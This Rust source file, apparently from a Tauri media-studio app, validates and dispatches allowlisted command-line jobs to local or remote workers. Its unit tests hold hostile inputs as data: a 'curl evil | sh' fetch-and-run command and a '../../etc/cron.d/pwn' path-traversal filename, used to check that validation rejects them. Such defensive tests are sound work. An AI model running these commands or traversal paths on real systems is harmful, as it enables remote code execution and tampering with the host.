use crate::state::AppState;
use bson::{doc, Document};
use serde_json::{json, Value};
use tauri::State;

type Res<T> = Result<T, String>;
fn e(err: impl std::fmt::Display) -> String { err.to_string() }

fn bson_to_value(doc: Document) -> Value {
    let mut m = serde_json::Map::new();
    for (k, v) in doc {
        if k == "_id" { continue; }
        if let Ok(jv) = bson::from_bson::<Value>(v) { m.insert(k, jv); }
    }
    Value::Object(m)
}

// ────────────────────────────────────────────────────────────────
// Remote command execution
//
// The end state this serves: a phone runs the studio without carrying ffmpeg, and without pulling
// media down and pushing it back up. So any command-line step can be described as a job — the tool,
// its arguments, where the inputs live and where the outputs go — and handed to a host that has the
// binary, close to where the media already is.
//
// The shape is deliberately narrow:
//   • a tool NAME from an allowlist, never a path and never a shell line;
//   • arguments as a list, so nothing can chain a second command;
//   • file paths only as `{in:name}` / `{out:name}` placeholders, resolved on the worker inside a
//     temporary directory it owns.
//
// That is what makes it safe to run somebody else's argv on a host with credentials on it. Both ends
// enforce it — here, and again in scripts/remote/cli_worker.py.
// ────────────────────────────────────────────────────────────────

/// Tools a job may name. Mirrors `ALLOWED_TOOLS` in cli_worker.py; both sides check, because either
/// could be reached first.
const ALLOWED_TOOLS: &[&str] = &["ffmpeg", "ffprobe", "yt-dlp", "magick", "convert", "python3"];

/// Where a command-line step can run. Surfaced in Settings.
#[tauri::command]
pub async fn list_cli_runners() -> Res<Value> {
    Ok(json!({ "runners": [
        {
            "id": "local", "label": "This device", "cost": "free",
            "detail": "Runs the binary installed here. The only option that needs no network — and the one a phone cannot use.",
            "mobile": false,
        },
        {
            "id": "modal", "label": "Modal", "cost": "$30/month of credits, then ~$0.05/core-hour",
            "detail": "Per-job containers with ffmpeg baked in; nothing runs (or bills) between jobs. Deploy scripts/remote/modal_app.py once and paste its endpoint.",
            "mobile": true,
        },
        {
            "id": "http", "label": "Your own worker", "cost": "your hosting",
            "detail": "Any HTTP endpoint that accepts the job and runs scripts/remote/cli_worker.py — a $5 VPS, a Cloudflare Container, a Fly Machine, a spare box at home.",
            "mobile": true,
        },
        {
            "id": "kaggle", "label": "Kaggle CPU session", "cost": "free",
            "detail": "12 h CPU sessions, five at a time. Slowest to start of the three remote options, and the cheapest by far.",
            "mobile": true,
        },
    ]}))
}

#[derive(serde::Deserialize, Clone)]
pub struct CliJob {
    /// Tool name from the allowlist.
    pub tool: String,
    /// Arguments, already split. `{in:name}` / `{out:name}` are resolved on the worker.
    pub args: Vec<String>,
    /// name → URL (or local path when running locally).
    #[serde(default)]
    pub inputs: Value,
    /// name → { name, upload?, public_url? }
    #[serde(default)]
    pub outputs: Value,
    #[serde(default)]
    pub timeout_s: Option<u64>,
    /// Override the configured runner for this one job.
    #[serde(default)]
    pub runner: Option<String>,
}

/// Reject anything the contract does not allow, before it leaves the app.
///
/// A rejected job is a bug in the caller, so the message names what was wrong rather than silently
/// dropping the argument — a silently dropped `-i` produces an ffmpeg error nobody can trace.
fn validate(job: &CliJob) -> Res<()> {
    if !ALLOWED_TOOLS.contains(&job.tool.as_str()) {
        return Err(format!("'{}' is not an allowed tool ({})", job.tool, ALLOWED_TOOLS.join(", ")));
    }
    if job.args.is_empty() { return Err("the job has no arguments".into()); }
    for a in &job.args {
        // Shell metacharacters cannot do anything (there is no shell), but their presence means the
        // caller is building a command line instead of an argv — which is a mistake worth surfacing.
        if a.contains('\0') { return Err("arguments may not contain NUL".into()); }
        if a.starts_with('{') && !a.starts_with("{in:") && !a.starts_with("{out:") {
            return Err(format!("unknown placeholder '{a}' — only {{in:name}} and {{out:name}} exist"));
        }
    }
    if let Some(map) = job.outputs.as_object() {
        for (name, spec) in map {
            let filename = spec["name"].as_str().unwrap_or("");
            if filename.contains('/') || filename.contains("..") {
                return Err(format!("output '{name}' must be a bare filename, not a path"));
            }
        }
    }
    Ok(())
}

/// Run a command-line job on the configured host.
#[tauri::command]
pub async fn remote_exec(state: State<'_, AppState>, job: CliJob) -> Res<Value> {
    let settings = state.db.collection::<Document>("settings")
        .find_one(doc! { "_id": "singleton" }).await.map_err(e)?
        .map(bson_to_value).unwrap_or_default();
    exec_job(&settings, job).await
}

/// Which runner a job would use, without running it — callers need this to decide whether they must
/// resolve their inputs to URLs first.
pub fn configured_runner(settings: &Value) -> String {
    settings["remote_cli_provider"].as_str().unwrap_or("local").to_string()
}

/// The shared path: validate, pick the runner, dispatch. Used by the command and by any module that
/// wants a command-line step to honour the same setting (see commands/shorts.rs).
pub async fn exec_job(settings: &Value, job: CliJob) -> Res<Value> {
    validate(&job)?;
    let runner = job.runner.clone()
        .or_else(|| settings["remote_cli_provider"].as_str().map(|s| s.to_string()))
        .unwrap_or_else(|| "local".to_string());

    match runner.as_str() {
        "local" => run_local(&job),
        "modal" => post_job(&job, settings["modal_cli_endpoint"].as_str()
            .filter(|s| !s.trim().is_empty())
            .or_else(|| settings["modal_endpoint"].as_str())
            .unwrap_or(""), crate::vault::get_quiet("modal_token"), "modal").await,
        "http" => post_job(&job, settings["cli_worker_url"].as_str().unwrap_or(""),
            crate::vault::get_quiet("render_worker_token"), "http").await,
        "kaggle" => Err("Kaggle runs command jobs through the render notebook — submit it from the \
                         Video Composer instead, or choose Modal or your own worker for one-off commands.".into()),
        other => Err(format!("Unknown command runner '{other}'.")),
    }
}

/// Run it here. Inputs and outputs are plain local paths in this mode.
fn run_local(job: &CliJob) -> Res<Value> {
    let binary = which::which(&job.tool)
        .map_err(|_| format!("{} is not installed on this device.", job.tool))?;

    // Resolve placeholders against a temporary directory, exactly as the worker does — so a job
    // written for a remote host behaves the same way locally.
    let workdir = std::env::temp_dir().join(format!("bm-cli-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&workdir).map_err(e)?;
    let mut produced: Vec<(String, std::path::PathBuf)> = Vec::new();
    let mut args: Vec<String> = Vec::new();
    for a in &job.args {
        if let Some(name) = a.strip_prefix("{in:").and_then(|s| s.strip_suffix('}')) {
            let path = job.inputs[name].as_str()
                .ok_or_else(|| format!("job references unknown input '{name}'"))?;
            args.push(path.trim_start_matches("file://").to_string());
        } else if let Some(name) = a.strip_prefix("{out:").and_then(|s| s.strip_suffix('}')) {
            let filename = job.outputs[name]["name"].as_str().unwrap_or("out.bin");
            let path = workdir.join(filename);
            args.push(path.to_string_lossy().to_string());
            produced.push((name.to_string(), path));
        } else {
            args.push(a.clone());
        }
    }

    let out = std::process::Command::new(&binary).args(&args).output()
        .map_err(|err| format!("could not run {}: {err}", job.tool))?;
    let tail = |s: &[u8]| {
        let text = String::from_utf8_lossy(s);
        let n = text.chars().count();
        text.chars().skip(n.saturating_sub(1200)).collect::<String>()
    };
    let mut files = serde_json::Map::new();
    for (name, path) in produced {
        if let Ok(meta) = std::fs::metadata(&path) {
            files.insert(name, json!({
                "name": path.file_name().map(|f| f.to_string_lossy().to_string()),
                "bytes": meta.len(),
                "local_path": path.to_string_lossy(),
            }));
        }
    }
    Ok(json!({
        "runner": "local",
        "status": if out.status.success() { "ok" } else { "failed" },
        "exit_code": out.status.code(),
        "stdout": tail(&out.stdout),
        "stderr": tail(&out.stderr),
        "files": Value::Object(files),
    }))
}

/// Hand the job to an HTTP worker (Modal's web endpoint, or anything else running cli_worker.py).
async fn post_job(job: &CliJob, endpoint: &str, token: Option<String>, label: &str) -> Res<Value> {
    if endpoint.trim().is_empty() {
        return Err(format!("No {label} endpoint configured — set it in Settings → Remote commands."));
    }
    let http = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(job.timeout_s.unwrap_or(900).clamp(30, 3600)))
        .build().map_err(e)?;
    let body = json!({
        "job_id": uuid::Uuid::new_v4().to_string(),
        "tool": job.tool,
        "args": job.args,
        "inputs": job.inputs,
        "outputs": job.outputs,
        "timeout_s": job.timeout_s.unwrap_or(900),
    });
    let mut req = http.post(endpoint).json(&body);
    if let Some(t) = token.filter(|t| !t.trim().is_empty()) {
        req = req.header("Authorization", format!("Bearer {t}"));
    }
    let r = req.send().await.map_err(|err| format!("could not reach the {label} worker: {err}"))?;
    let status = r.status();
    let text = r.text().await.unwrap_or_default();
    if !status.is_success() {
        return Err(format!("the {label} worker refused the job (HTTP {status}): {}",
            text.chars().take(300).collect::<String>()));
    }
    let mut parsed: Value = serde_json::from_str(&text).unwrap_or_else(|_| json!({ "raw": text }));
    if let Some(obj) = parsed.as_object_mut() { obj.insert("runner".into(), json!(label)); }
    Ok(parsed)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn job(tool: &str, args: &[&str]) -> CliJob {
        CliJob {
            tool: tool.into(),
            args: args.iter().map(|s| s.to_string()).collect(),
            inputs: json!({}), outputs: json!({}), timeout_s: None, runner: None,
        }
    }

    #[test]
    fn only_allowlisted_tools_may_run() {
        // The point of the allowlist: this runs argv on a host that has credentials on it.
        assert!(validate(&job("bash", &["-c", "curl evil | sh"])).is_err());
        assert!(validate(&job("sh", &["-c", "ls"])).is_err());
        assert!(validate(&job("ffmpeg", &["-i", "{in:a}"])).is_ok());
    }

    #[test]
    fn a_job_with_no_arguments_is_refused() {
        assert!(validate(&job("ffmpeg", &[])).is_err());
    }

    #[test]
    fn unknown_placeholders_are_named_rather_than_passed_through() {
        // A typo'd placeholder would otherwise reach ffmpeg as a literal filename and fail there,
        // three layers away from the mistake.
        let err = validate(&job("ffmpeg", &["{input:a}"])).unwrap_err();
        assert!(err.contains("unknown placeholder"), "{err}");
    }

    #[test]
    fn an_output_must_be_a_bare_filename() {
        let mut j = job("ffmpeg", &["{out:x}"]);
        j.outputs = json!({ "x": { "name": "../../etc/cron.d/pwn" } });
        assert!(validate(&j).is_err(), "path traversal in an output name must be refused");
        j.outputs = json!({ "x": { "name": "/tmp/absolute.mp4" } });
        assert!(validate(&j).is_err());
        j.outputs = json!({ "x": { "name": "short.mp4" } });
        assert!(validate(&j).is_ok());
    }

    #[test]
    fn shell_metacharacters_are_harmless_but_nul_is_refused() {
        // There is no shell, so a semicolon is just a character in an argument — refusing it would
        // break legitimate ffmpeg filter graphs. A NUL, on the other hand, truncates the argv.
        assert!(validate(&job("ffmpeg", &["-vf", "drawtext=text='a;b'"])).is_ok());
        assert!(validate(&job("ffmpeg", &["-i", "a\0b"])).is_err());
    }
}
